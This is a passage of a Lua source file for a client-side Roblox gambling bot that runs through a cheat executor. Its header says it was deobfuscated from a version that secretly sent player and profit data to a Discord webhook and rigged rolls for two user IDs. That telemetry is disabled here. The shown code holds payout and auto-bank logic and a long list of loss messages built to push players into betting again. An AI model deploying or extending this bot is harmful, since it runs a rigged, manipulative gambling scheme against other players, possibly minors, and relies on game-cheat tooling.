-- Deobfuscated from the Prometheus-protected source that previously occupied
-- this file. The program is a client-side Roblox gambling bot.
--
-- Security findings retained as comments instead of hidden behavior:
--   * The original sent player, server, balance, and profit data to a hard-coded
--     Discord webhook, independently of `_G.discordwebhook`.
--   * The webhook credential has been redacted and its telemetry disabled below.
--   * Rolls are deliberately rerolled in favor of two hard-coded user IDs.
--
-- Executor-provided globals used by the original: `request`, `time`, and `wait`.

----------------------------------------------------------------
-- LOAD + SINGLE-INSTANCE GUARD
----------------------------------------------------------------
if not game:IsLoaded() then
    game.Loaded:Wait()
end

local globalEnvironment = (getgenv and getgenv()) or _G
local runtimeKey = "GambleBotBank_Runtime"
local previousRuntime = globalEnvironment[runtimeKey]

-- Ask the old copy to stop before replacing it. Its cleanup function disconnects
-- service events and removes the old UI, preventing duplicate loops, messages,
-- payouts, or bank transfers after the script is executed again.
if type(previousRuntime) == "table" then
    previousRuntime.stopRequested = true
    if type(previousRuntime.cleanup) == "function" then
        pcall(previousRuntime.cleanup, true)
    end
elseif globalEnvironment.GambleBotBank_LOADED then
    -- Compatibility fallback for a partially initialized previous copy.
    globalEnvironment.GambleBotBank_Stop = true
end

pcall(function()
    local players = game:GetService("Players")
    local playerGui = players.LocalPlayer and players.LocalPlayer:FindFirstChild("PlayerGui")
    local oldUi = playerGui and playerGui:FindFirstChild("GambleBotBankUI")
    if oldUi then
        oldUi:Destroy()
    end
end)

local runtime = {
    stopRequested = false,
    connections = {},
}
globalEnvironment[runtimeKey] = runtime
globalEnvironment.GambleBotBank_LOADED = true

-- This early cleanup is replaced below once all local state exists. It still
-- makes a re-execution during startup safe.
runtime.cleanup = function(replacing)
    runtime.stopRequested = true
    for _, connection in ipairs(runtime.connections) do
        pcall(function()
            connection:Disconnect()
        end)
    end
    table.clear(runtime.connections)
    pcall(function()
        local playerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
        local gui = playerGui and playerGui:FindFirstChild("GambleBotBankUI")
        if gui then
            gui:Destroy()
        end
    end)
    if not replacing and globalEnvironment[runtimeKey] == runtime then
        globalEnvironment[runtimeKey] = nil
        globalEnvironment.GambleBotBank_LOADED = nil
    end
end

local function trackConnection(connection)
    if runtime.stopRequested then
        pcall(function()
            connection:Disconnect()
        end)
        return connection
    end

    table.insert(runtime.connections, connection)
    return connection
end

task.wait(0.2)
if runtime.stopRequested or globalEnvironment[runtimeKey] ~= runtime then
    return
end
globalEnvironment.GambleBotBank_Stop = false

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local Events = ReplicatedStorage:WaitForChild("_CS.Events")

local generalTextChannel
if TextChatService:FindFirstChild("TextChannels", false) then
    generalTextChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
end

local running = true
local interactionDistance = 15
local odds = _G.odds or 65
local commandCooldownSeconds = _G.cmdcooldown or 4
local configuredWebhookUrl = _G.discordwebhook or ""

-- The original contained a live Discord webhook here and used it for
-- undisclosed telemetry. It is intentionally disabled in this reconstruction.
local internalTelemetryWebhookUrl = nil
local internalStartupReported = false

local payoutQueue = {}
local messageQueue = {}
local commandCooldowns = {}
local commandCooldownWarnings = {}
local betCooldowns = {}
local greetingCooldowns = {}
local playerNetResults = {}

local nextPayoutAt = time()
local greetingMutedUntil = time()
local currentBalance = 0
local sessionProfit = 0

-- Auto-bank defaults are deliberately disabled. The UI starts with the
-- suggested $1,000,000 trigger and $500,000 reserve, but nothing is sent until
-- the user selects a player and explicitly enables banking.
local bankSettings = {
    enabled = false,
    player = nil,
    triggerBalance = 1000000,
    reserveBalance = 500000,
}
local bankTransferQueued = false
local bankAwaitingBalanceDrop = false
local bankStatusText = "Select a bank player, then enable auto bank."
local bankStatusIsError = false
local bankUi = {}

local CONFIG_FOLDER = "GambleBotBank_Configs"
local configName = "default"

local function formatMoney(amount)
    local text = tostring(math.floor(tonumber(amount) or 0))
    local formatted = text
    local replacements

    repeat
        formatted, replacements = string.gsub(formatted, "^(-?%d+)(%d%d%d)", "%1,%2")
    until replacements == 0

    return "$" .. formatted
end

local function parseMoney(text)
    local cleaned = string.gsub(tostring(text or ""), "[^%d%.%-]", "")
    local amount = tonumber(cleaned)
    if amount == nil then
        return nil
    end

    return math.floor(amount)
end

local function setBankStatus(text, isError)
    bankStatusText = text
    bankStatusIsError = isError == true

    if bankUi.statusLabel then
        bankUi.statusLabel.Text = text
        bankUi.statusLabel.TextColor3 = bankStatusIsError and Color3.fromRGB(248, 113, 113)
            or Color3.fromRGB(148, 163, 184)
    end
end

local function updateBankUi()
    if bankUi.balanceValue then
        bankUi.balanceValue.Text = formatMoney(currentBalance)
    end
    if bankUi.profitValue then
        bankUi.profitValue.Text = "Session profit: " .. formatMoney(sessionProfit)
    end
    if bankUi.toggleButton then
        bankUi.toggleButton.Text = bankSettings.enabled and "DISABLE AUTO BANK" or "ENABLE AUTO BANK"
        bankUi.toggleButton.BackgroundColor3 = bankSettings.enabled and Color3.fromRGB(220, 38, 38)
            or Color3.fromRGB(37, 99, 235)
    end
end

local greetingReplies = {
    "/e wave",
    "Hello!",
    "Hi!",
    "Good evening.",
    "Good evening!",
    "Greetings!",
    "Good afternoon!",
    "Evening!",
}

local greetingPatterns = {
    "hello",
    "hi",
    "evening",
    "/e wave",
    "greetings",
    "morning",
    "bonjour",
    "konichiwa",
    "こんにちは",
    "good afternoon",
}

local returningPlayerReplies = {
    "Welcome back, {name}!",
    "Nice to see you again, {name}!",
    "I knew you couldn't resist, {name}!",
    "Pleasure to see you again, {name}!",
    "Welcome back!",
    "Great to see you {name}!",
    "Nice to see you!",
    "Always a pleasure to see you {name}!",
}

local gamblingPrompts = {
    "Type !help to get started!",
    "If you're ready to gamble, just send me cash!",
    "Send cash to start a roll!",
}

local winReplies = {
    "Nice!",
    "Congratulations on the win!",
    "Congratulations!",
    "That's one less meal for my family!",
    "Jackpot!",
    "Nice going!",
    "Wow!",
    "Your training has paid off!",
    "You're going up in this world!",
    "Amazing!",
    "You're so skilled!",
    "Wow that luck is insane!",
    "Well done!",
    "Lets go!",
    "Nice one!",
    "Incredible win!",
    "Amazing luck!",
    "I knew you could do it!",
    "I'm so happy for you!",
    "This is a triumph!",
    "I never doubted you!",
    "Awesome!",
    "Quit while you're ahead!",
    "Fantastic!",
}

local lossReplies = {
    "Remember, 99% quit before they win big!",
    "You'll get it next time!",
    "Unfortunate, but I feel your big win coming!",
    "Every loser is a winner waiting to happen!",
    "You'll win next time!",
    "One more round! I feel it!",
    "Better luck next time!",
    "Don't be the 99% that quit now!",
    "You can do this! Just one more!",
    "Never give up sir!",
    "Never give up!",
    "You can do this!",
    "I believe in you!",
    "A winner never quits!",
    "Pain only makes you stronger!",
    "Don't give up!",
    "Don't give in to the voices of doubt!",
    "Every winner starts somewhere!",
    "You're better than this! Don't give up!",
    "Despair always comes before hope!",
    "For every loss there is a win!",
    "Keep on trying! You can do it!",
    "You can't give up now!",
    "You can win it back next round!",
    "Don't listen to doubt!",
    "Be the 1% that continues and wins it all!",
    "It's not mission over yet!",
    "Think of the gains! Keep going!",
    "Profit equals hard work! You can do it!",
    "You were so close!",
    "There's always light at the end of the tunnel!",
    "There's always treasure in a shipwreck!",
    "There's a rainbow after the rain!",
}

local function postJson(url, payload)
    if url == nil or url == "" then
        return
    end

    request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Body = HttpService:JSONEncode(payload),
    })
end

-- These names were globals in the input and are kept global for compatibility.
function SendWebhook(message)
    postJson(configuredWebhookUrl, {
        content = message,
    })
end

function SendEmbdedWebHookInternal(url, description, color, authorName, title)
    postJson(url, {
        content = nil,
        embeds = {
            {
                title = title or LocalPlayer.Name,
                description = description,
                color = color or "57599",
                author = {
                    name = authorName or ("Gambling bot | " .. LocalPlayer.Name),
                },
            },
        },
    })
end

function SendEmbdedWebHook(description, color, authorName, title)
    if configuredWebhookUrl == nil or configuredWebhookUrl == "" then
        return
    end

    SendEmbdedWebHookInternal(configuredWebhookUrl, description, color, authorName, title)
end

function RealSendMessage(message)
    print("Sending message " .. message)

    if TextChatService:FindFirstChild("TextChannels", false) then
        generalTextChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
    end

    if generalTextChannel ~= nil then
        generalTextChannel:SendAsync(message)
        return
    end

    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "ALL")
end

function SendMessage(message)
    table.insert(messageQueue, message)
end

function SendMoney(player, amount, isBankTransfer)
    table.insert(payoutQueue, { player, amount, isBankTransfer == true })
end

local function cancelQueuedBankTransfer()
    for index = #payoutQueue, 1, -1 do
        if payoutQueue[index][3] then
            table.remove(payoutQueue, index)
        end
    end

    bankTransferQueued = false
    bankAwaitingBalanceDrop = false
end

runtime.cleanup = function(replacing)
    if runtime.stopRequested and not replacing then
        return
    end

    runtime.stopRequested = true
    running = false
    bankSettings.enabled = false
    cancelQueuedBankTransfer()
    globalEnvironment.GambleBotBank_Stop = true

    for _, connection in ipairs(runtime.connections) do
        pcall(function()
            connection:Disconnect()
        end)
    end
    table.clear(runtime.connections)

    pcall(function()
        if bankUi.screenGui then
            bankUi.screenGui:Destroy()
        else
            local gui = LocalPlayer:FindFirstChild("PlayerGui")
            gui = gui and gui:FindFirstChild("GambleBotBankUI")
            if gui then
                gui:Destroy()
            end
        end
    end)

    if not replacing and globalEnvironment[runtimeKey] == runtime then
        globalEnvironment[runtimeKey] = nil
        globalEnvironment.GambleBotBank_LOADED = nil
    end
end

local function processPayoutQueue()
    if #payoutQueue < 1 then
        return
    end

    local payout = payoutQueue[1]
    Events.GiveMoneyToPlr:FireServer(payout[1], tostring(payout[2]))
    table.remove(payoutQueue, 1)

    if payout[3] then
        bankTransferQueued = false
        bankAwaitingBalanceDrop = true
        currentBalance = math.max(bankSettings.reserveBalance, currentBalance - payout[2])
        setBankStatus(
            "Sent " .. formatMoney(payout[2]) .. " to " .. payout[1].Name
                .. ". Waiting for the balance to refresh.",
            false
        )
        updateBankUi()
    end
end

local function processMessageQueue()
    if #messageQueue < 1 then
        return 0
    end

    local nextMessageLength = 0
    if #messageQueue > 1 then
        nextMessageLength = #messageQueue[2]
    end

    RealSendMessage(messageQueue[1])
    table.remove(messageQueue, 1)
    return nextMessageLength
end

function GetMaxBet()
    return math.min(math.floor(currentBalance / 2.2), 125000)
end

local function processAutoBank()
    if not bankSettings.enabled then
        return
    end

    local bankPlayer = bankSettings.player
    if bankPlayer == nil or bankPlayer.Parent ~= Players then
        bankSettings.enabled = false
        cancelQueuedBankTransfer()
        setBankStatus("Bank player left the server. Auto bank was disabled.", true)
        updateBankUi()
        return
    end

    if bankTransferQueued then
        return
    end

    -- Do not send the same transfer more than once while the server is still
    -- reporting the old balance. Disabling/re-enabling auto bank also resets
    -- this safeguard if a transfer fails outside this script.
    if bankAwaitingBalanceDrop then
        if currentBalance < bankSettings.triggerBalance then
            bankAwaitingBalanceDrop = false
            setBankStatus(
                "Transfer confirmed. Reserve balance: " .. formatMoney(currentBalance) .. ".",
                false
            )
        else
            setBankStatus("Transfer sent; waiting for the server balance to update.", false)
        end
        return
    end

    if currentBalance < bankSettings.triggerBalance then
        setBankStatus(
            "Waiting for " .. formatMoney(bankSettings.triggerBalance) .. ". Current balance: "
                .. formatMoney(currentBalance) .. ".",
            false
        )
        return
    end

    local transferAmount = math.floor(currentBalance - bankSettings.reserveBalance)
    if transferAmount <= 0 then
        setBankStatus("Reserve must be lower than the trigger balance.", true)
        return
    end

    bankTransferQueued = true
    SendMoney(bankPlayer, transferAmount, true)
    setBankStatus(
        "Queued " .. formatMoney(transferAmount) .. " for " .. bankPlayer.Name .. ".",
        false
    )
end

----------------------------------------------------------------
-- NAMED CONFIGURATION PERSISTENCE
----------------------------------------------------------------
local function normalizeConfigName(name)
    local normalized = tostring(name or ""):match("^%s*(.-)%s*$")
    normalized = normalized:gsub("[^%w_%- ]", ""):gsub("%s+", "_"):sub(1, 48)
    if normalized == "" then
        normalized = "default"
    end
    return normalized
end

local function configPath(name)
    return CONFIG_FOLDER .. "/" .. normalizeConfigName(name) .. ".json"
end

local function ensureConfigFolder()
    if type(makefolder) ~= "function" then
        return false, "This executor does not support makefolder."
    end

    local folderExists = false
    if type(isfolder) == "function" then
        local checked, result = pcall(isfolder, CONFIG_FOLDER)
        folderExists = checked and result == true
    end

    if not folderExists then
        -- Some executors throw when the folder already exists, so this is
        -- intentionally best-effort. The subsequent file operation provides
        -- the useful error if the folder is genuinely unavailable.
        pcall(makefolder, CONFIG_FOLDER)
    end

    return true
end

local function saveConfiguration(name)
    if type(writefile) ~= "function" then
        return false, "This executor does not support writefile."
    end

    local folderReady, folderError = ensureConfigFolder()
    if not folderReady then
        return false, folderError
    end

    configName = normalizeConfigName(name)
    local data = {
        version = 1,
        bankEnabled = bankSettings.enabled,
        bankPlayerName = bankSettings.player and bankSettings.player.Name or "",
        triggerBalance = bankSettings.triggerBalance,
        reserveBalance = bankSettings.reserveBalance,
        odds = odds,
        commandCooldownSeconds = commandCooldownSeconds,
    }

    local encodedOk, encoded = pcall(function()
        return HttpService:JSONEncode(data)
    end)
    if not encodedOk then
        return false, "Could not encode the configuration: " .. tostring(encoded)
    end

    local writeOk, writeError = pcall(writefile, configPath(configName), encoded)
    if not writeOk then
        return false, "Could not save the configuration: " .. tostring(writeError)
    end

    return true, "Saved configuration '" .. configName .. "'."
end

local function loadConfiguration(name, silentMissing)
    if type(readfile) ~= "function" or type(isfile) ~= "function" then
        if silentMissing then
            return false, nil
        end
        return false, "This executor does not support readfile/isfile."
    end

    configName = normalizeConfigName(name)
    local path = configPath(configName)
    local existsOk, exists = pcall(isfile, path)
    if not existsOk or not exists then
        if silentMissing then
            return false, nil
        end
        return false, "Configuration '" .. configName .. "' does not exist."
    end

    local readOk, contents = pcall(readfile, path)
    if not readOk then
        return false, "Could not read the configuration: " .. tostring(contents)
    end

    local decodeOk, data = pcall(function()
        return HttpService:JSONDecode(contents)
    end)
    if not decodeOk or type(data) ~= "table" then
        return false, "The configuration is not valid JSON."
    end

    local loadedTrigger = tonumber(data.triggerBalance)
    local loadedReserve = tonumber(data.reserveBalance)
    if not loadedTrigger or not loadedReserve then
        return false, "The saved trigger or reserve balance is invalid."
    end

    loadedTrigger = math.floor(loadedTrigger)
    loadedReserve = math.floor(loadedReserve)
    if loadedTrigger <= 0 or loadedReserve < 0 or loadedReserve >= loadedTrigger then
        return false, "The saved balances must satisfy: trigger > reserve >= 0."
    end

    cancelQueuedBankTransfer()
    bankAwaitingBalanceDrop = false
    bankSettings.triggerBalance = loadedTrigger
    bankSettings.reserveBalance = loadedReserve

    local savedPlayerName = type(data.bankPlayerName) == "string" and data.bankPlayerName or ""
    local savedPlayer = savedPlayerName ~= "" and Players:FindFirstChild(savedPlayerName) or nil
    if savedPlayer == LocalPlayer then
        savedPlayer = nil
    end
    bankSettings.player = savedPlayer

    local loadedOdds = tonumber(data.odds)
    if loadedOdds and loadedOdds >= 11 and loadedOdds <= 100 then
        odds = loadedOdds
    end
    local loadedCooldown = tonumber(data.commandCooldownSeconds)
    if loadedCooldown and loadedCooldown >= 0 and loadedCooldown <= 3600 then
        commandCooldownSeconds = loadedCooldown
    end

    local wantedEnabled = data.bankEnabled == true
    bankSettings.enabled = wantedEnabled and savedPlayer ~= nil
    if wantedEnabled and not savedPlayer then
        setBankStatus(
            "Loaded '" .. configName .. "', but its bank player is not in this server. Auto bank is disabled.",
            true
        )
    elseif bankSettings.enabled then
        setBankStatus("Loaded '" .. configName .. "'. Auto bank is enabled.", false)
    else
        setBankStatus("Loaded configuration '" .. configName .. "'.", false)
    end

    if bankUi.refreshFromConfig then
        bankUi.refreshFromConfig()
    else
        updateBankUi()
    end
    return true
end

local function createBankUi()
    if runtime.stopRequested then
        return nil
    end

    local function create(className, parent, properties)
        local instance = Instance.new(className)
        for property, value in pairs(properties or {}) do
            instance[property] = value
        end
        instance.Parent = parent
        return instance
    end

    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    if runtime.stopRequested then
        return nil
    end

    local oldUi = playerGui:FindFirstChild("GambleBotBankUI")
    if oldUi then
        oldUi:Destroy()
    end

    local colors = {
        background = Color3.fromRGB(15, 23, 42),
        panel = Color3.fromRGB(30, 41, 59),
        input = Color3.fromRGB(51, 65, 85),
        border = Color3.fromRGB(71, 85, 105),
        primary = Color3.fromRGB(37, 99, 235),
        text = Color3.fromRGB(241, 245, 249),
        muted = Color3.fromRGB(148, 163, 184),
    }

    local screenGui = create("ScreenGui", playerGui, {
        Name = "GambleBotBankUI",
        ResetOnSpawn = false,
        IgnoreGuiInset = true,
        DisplayOrder = 1000,
        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    })

    local mainFrame = create("Frame", screenGui, {
        Name = "Window",
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0.5, 0, 0.5, 0),
        Size = UDim2.fromOffset(420, 586),
        BackgroundColor3 = colors.background,
        BorderSizePixel = 0,
        Active = true,
        Draggable = true,
        ClipsDescendants = true,
    })
    create("UICorner", mainFrame, { CornerRadius = UDim.new(0, 14) })
    create("UIStroke", mainFrame, {
        Color = colors.border,
        Transparency = 0.25,
        Thickness = 1,
    })

    local header = create("Frame", mainFrame, {
        Name = "Header",
        Size = UDim2.new(1, 0, 0, 60),
        BackgroundColor3 = colors.panel,
        BorderSizePixel = 0,
    })
    create("UICorner", header, { CornerRadius = UDim.new(0, 14) })
    create("Frame", header, {
        Position = UDim2.new(0, 0, 1, -14),
        Size = UDim2.new(1, 0, 0, 14),
        BackgroundColor3 = colors.panel,
        BorderSizePixel = 0,
    })
    create("TextLabel", header, {
        Position = UDim2.fromOffset(18, 10),
        Size = UDim2.new(1, -76, 0, 24),
        BackgroundTransparency = 1,
        Text = "GAMBLE BANK",
        TextColor3 = colors.text,
        Font = Enum.Font.GothamBold,
        TextSize = 18,
        TextXAlignment = Enum.TextXAlignment.Left,
    })
    create("TextLabel", header, {
        Position = UDim2.fromOffset(18, 34),
        Size = UDim2.new(1, -76, 0, 16),
        BackgroundTransparency = 1,
        Text = "Auto-reserve controls  •  RightShift toggles UI",
        TextColor3 = colors.muted,
        Font = Enum.Font.Gotham,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Left,
    })

    local minimizeButton = create("TextButton", header, {
        Position = UDim2.new(1, -48, 0, 12),
        Size = UDim2.fromOffset(34, 34),
        BackgroundColor3 = colors.input,
        BorderSizePixel = 0,
        Text = "−",
        TextColor3 = colors.text,
        Font = Enum.Font.GothamBold,
        TextSize = 18,
        AutoButtonColor = true,
    })
    create("UICorner", minimizeButton, { CornerRadius = UDim.new(0, 8) })

    local balanceCard = create("Frame", mainFrame, {
        Position = UDim2.fromOffset(16, 76),
        Size = UDim2.new(1, -32, 0, 76),
        BackgroundColor3 = colors.panel,
        BorderSizePixel = 0,
    })
    create("UICorner", balanceCard, { CornerRadius = UDim.new(0, 10) })
    create("TextLabel", balanceCard, {
        Position = UDim2.fromOffset(14, 10),
        Size = UDim2.new(0.5, -14, 0, 16),
        BackgroundTransparency = 1,
        Text = "CURRENT BALANCE",
        TextColor3 = colors.muted,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Left,
    })
    local balanceValue = create("TextLabel", balanceCard, {
        Position = UDim2.fromOffset(14, 28),
        Size = UDim2.new(0.55, -14, 0, 34),
        BackgroundTransparency = 1,
        Text = formatMoney(currentBalance),
        TextColor3 = colors.text,
        Font = Enum.Font.GothamBold,
        TextSize = 26,
        TextXAlignment = Enum.TextXAlignment.Left,
    })
    local profitValue = create("TextLabel", balanceCard, {
        Position = UDim2.new(0.55, 0, 0, 28),
        Size = UDim2.new(0.45, -14, 0, 34),
        BackgroundTransparency = 1,
        Text = "Session profit: " .. formatMoney(sessionProfit),
        TextColor3 = colors.muted,
        Font = Enum.Font.GothamMedium,
        TextSize = 12,
        TextXAlignment = Enum.TextXAlignment.Right,
    })

    create("TextLabel", mainFrame, {
        Position = UDim2.fromOffset(18, 168),
        Size = UDim2.new(1, -36, 0, 16),
        BackgroundTransparency = 1,
        Text = "BANK PLAYER",
        TextColor3 = colors.muted,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Left,
    })
    local playerButton = create("TextButton", mainFrame, {
        Position = UDim2.fromOffset(16, 188),
        Size = UDim2.new(1, -32, 0, 40),
        BackgroundColor3 = colors.input,
        BorderSizePixel = 0,
        Text = "Select a player in this server  ▾",
        TextColor3 = colors.text,
        Font = Enum.Font.GothamMedium,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        AutoButtonColor = true,
        ZIndex = 5,
    })
    create("UICorner", playerButton, { CornerRadius = UDim.new(0, 8) })
    create("UIPadding", playerButton, {
        PaddingLeft = UDim.new(0, 12),
        PaddingRight = UDim.new(0, 12),
    })

    local playerDropdown = create("ScrollingFrame", mainFrame, {
        Position = UDim2.fromOffset(16, 232),
        Size = UDim2.new(1, -32, 0, 148),
        BackgroundColor3 = Color3.fromRGB(30, 41, 59),
        BorderSizePixel = 0,
        ScrollBarThickness = 4,
        ScrollBarImageColor3 = colors.muted,
        CanvasSize = UDim2.fromOffset(0, 0),
        Visible = false,
        ZIndex = 20,
    })
    create("UICorner", playerDropdown, { CornerRadius = UDim.new(0, 8) })

    create("TextLabel", mainFrame, {
        Position = UDim2.fromOffset(18, 244),
        Size = UDim2.new(0.5, -26, 0, 16),
        BackgroundTransparency = 1,
        Text = "TRANSFER TRIGGER",
        TextColor3 = colors.muted,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Left,
    })
    create("TextLabel", mainFrame, {
        Position = UDim2.new(0.5, 8, 0, 244),
        Size = UDim2.new(0.5, -26, 0, 16),
        BackgroundTransparency = 1,
        Text = "BALANCE TO KEEP",
        TextColor3 = colors.muted,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Left,
    })

    local triggerInput = create("TextBox", mainFrame, {
        Position = UDim2.fromOffset(16, 264),
        Size = UDim2.new(0.5, -24, 0, 42),
        BackgroundColor3 = colors.input,
        BorderSizePixel = 0,
        Text = tostring(bankSettings.triggerBalance),
        PlaceholderText = "1000000",
        TextColor3 = colors.text,
        PlaceholderColor3 = colors.muted,
        Font = Enum.Font.GothamMedium,
        TextSize = 14,
        ClearTextOnFocus = false,
    })
    create("UICorner", triggerInput, { CornerRadius = UDim.new(0, 8) })

    local reserveInput = create("TextBox", mainFrame, {
        Position = UDim2.new(0.5, 8, 0, 264),
        Size = UDim2.new(0.5, -24, 0, 42),
        BackgroundColor3 = colors.input,
        BorderSizePixel = 0,
        Text = tostring(bankSettings.reserveBalance),
        PlaceholderText = "500000",
        TextColor3 = colors.text,
        PlaceholderColor3 = colors.muted,
        Font = Enum.Font.GothamMedium,
        TextSize = 14,
        ClearTextOnFocus = false,
    })
    create("UICorner", reserveInput, { CornerRadius = UDim.new(0, 8) })

    local transferPreview = create("TextLabel", mainFrame, {
        Position = UDim2.fromOffset(18, 318),
        Size = UDim2.new(1, -36, 0, 38),
        BackgroundTransparency = 1,
        Text = "At $1,000,000, send the excess and keep $500,000 available for payouts.",
        TextColor3 = colors.muted,
        Font = Enum.Font.Gotham,
        TextSize = 12,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
    })

    create("TextLabel", mainFrame, {
        Position = UDim2.fromOffset(18, 364),
        Size = UDim2.new(1, -36, 0, 16),
        BackgroundTransparency = 1,
        Text = "NAMED CONFIGURATION",
        TextColor3 = colors.muted,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Left,
    })

    local configInput = create("TextBox", mainFrame, {
        Name = "ConfigName",
        Position = UDim2.fromOffset(16, 384),
        Size = UDim2.fromOffset(180, 40),
        BackgroundColor3 = colors.input,
        BorderSizePixel = 0,
        Text = configName,
        PlaceholderText = "default",
        TextColor3 = colors.text,
        PlaceholderColor3 = colors.muted,
        Font = Enum.Font.GothamMedium,
        TextSize = 13,
        ClearTextOnFocus = false,
    })
    create("UICorner", configInput, { CornerRadius = UDim.new(0, 8) })

    local saveButton = create("TextButton", mainFrame, {
        Name = "SaveConfig",
        Position = UDim2.fromOffset(204, 384),
        Size = UDim2.fromOffset(94, 40),
        BackgroundColor3 = colors.input,
        BorderSizePixel = 0,
        Text = "SAVE",
        TextColor3 = colors.text,
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        AutoButtonColor = true,
    })
    create("UICorner", saveButton, { CornerRadius = UDim.new(0, 8) })

    local loadButton = create("TextButton", mainFrame, {
        Name = "LoadConfig",
        Position = UDim2.fromOffset(306, 384),
        Size = UDim2.fromOffset(98, 40),
        BackgroundColor3 = colors.input,
        BorderSizePixel = 0,
        Text = "LOAD",
        TextColor3 = colors.text,
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        AutoButtonColor = true,
    })
    create("UICorner", loadButton, { CornerRadius = UDim.new(0, 8) })

    local toggleButton = create("TextButton", mainFrame, {
        Position = UDim2.fromOffset(16, 440),
        Size = UDim2.new(1, -32, 0, 44),
        BackgroundColor3 = colors.primary,
        BorderSizePixel = 0,
        Text = "ENABLE AUTO BANK",
        TextColor3 = Color3.fromRGB(255, 255, 255),
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        AutoButtonColor = true,
    })
    create("UICorner", toggleButton, { CornerRadius = UDim.new(0, 9) })

    local statusLabel = create("TextLabel", mainFrame, {
        Position = UDim2.fromOffset(18, 498),
        Size = UDim2.new(1, -36, 0, 62),
        BackgroundTransparency = 1,
        Text = bankStatusText,
        TextColor3 = colors.muted,
        Font = Enum.Font.Gotham,
        TextSize = 12,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
    })

    bankUi = {
        screenGui = screenGui,
        mainFrame = mainFrame,
        balanceValue = balanceValue,
        profitValue = profitValue,
        playerButton = playerButton,
        playerDropdown = playerDropdown,
        triggerInput = triggerInput,
        reserveInput = reserveInput,
        transferPreview = transferPreview,
        configInput = configInput,
        saveButton = saveButton,
        loadButton = loadButton,
        toggleButton = toggleButton,
        statusLabel = statusLabel,
    }

    local selectedPlayer = bankSettings.player

    local function updatePreview()
        local trigger = parseMoney(triggerInput.Text)
        local reserve = parseMoney(reserveInput.Text)
        if trigger and reserve and trigger > reserve then
            transferPreview.Text = "At " .. formatMoney(trigger) .. ", send "
                .. formatMoney(trigger - reserve) .. " or more and keep " .. formatMoney(reserve)
                .. " available for payouts."
        else
            transferPreview.Text = "The trigger must be greater than the balance you want to keep."
        end
    end

    local function selectPlayer(player)
        if bankSettings.enabled and bankSettings.player ~= player then
            bankSettings.enabled = false
            cancelQueuedBankTransfer()
        end

        selectedPlayer = player
        bankSettings.player = player
        playerButton.Text = player.DisplayName .. "  (@" .. player.Name .. ")  ▾"
        playerDropdown.Visible = false
        setBankStatus("Selected " .. player.Name .. ". Review the balances and enable auto bank.", false)
        updateBankUi()
    end

    local function rebuildPlayerDropdown()
        playerDropdown:ClearAllChildren()
        create("UICorner", playerDropdown, { CornerRadius = UDim.new(0, 8) })
        create("UIListLayout", playerDropdown, {
            Padding = UDim.new(0, 4),
            SortOrder = Enum.SortOrder.LayoutOrder,
        })
        create("UIPadding", playerDropdown, {
            PaddingTop = UDim.new(0, 6),
            PaddingBottom = UDim.new(0, 6),
            PaddingLeft = UDim.new(0, 6),
            PaddingRight = UDim.new(0, 6),
        })

        local count = 0
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                count = count + 1
                local bankCandidate = player
                local option = create("TextButton", playerDropdown, {
                    Size = UDim2.new(1, -12, 0, 34),
                    BackgroundColor3 = colors.input,
                    BorderSizePixel = 0,
                    Text = player.DisplayName .. "  (@" .. player.Name .. ")",
                    TextColor3 = colors.text,
                    Font = Enum.Font.GothamMedium,
                    TextSize = 12,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    AutoButtonColor = true,
                    LayoutOrder = count,
                    ZIndex = 21,
                })
                create("UICorner", option, { CornerRadius = UDim.new(0, 7) })
                create("UIPadding", option, { PaddingLeft = UDim.new(0, 10) })
                option.MouseButton1Click:Connect(function()
                    selectPlayer(bankCandidate)
                end)
            end
        end

        if count == 0 then
            create("TextLabel", playerDropdown, {
                Size = UDim2.new(1, -12, 0, 38),
                BackgroundTransparency = 1,
                Text = "No other players are in this server.",
                TextColor3 = colors.muted,
                Font = Enum.Font.Gotham,
                TextSize = 12,
                ZIndex = 21,
            })
        end

        playerDropdown.CanvasSize = UDim2.fromOffset(0, math.max(50, count * 38 + 12))
    end

    bankUi.refreshFromConfig = function()
        selectedPlayer = bankSettings.player
        triggerInput.Text = tostring(bankSettings.triggerBalance)
        reserveInput.Text = tostring(bankSettings.reserveBalance)
        configInput.Text = configName
        if selectedPlayer then
            playerButton.Text = selectedPlayer.DisplayName .. "  (@" .. selectedPlayer.Name .. ")  ▾"
        else
            playerButton.Text = "Select a player in this server  ▾"
        end
        rebuildPlayerDropdown()
        updatePreview()
        updateBankUi()
    end

    playerButton.MouseButton1Click:Connect(function()
        rebuildPlayerDropdown()
        playerDropdown.Visible = not playerDropdown.Visible
    end)

    triggerInput.FocusLost:Connect(updatePreview)
    reserveInput.FocusLost:Connect(updatePreview)

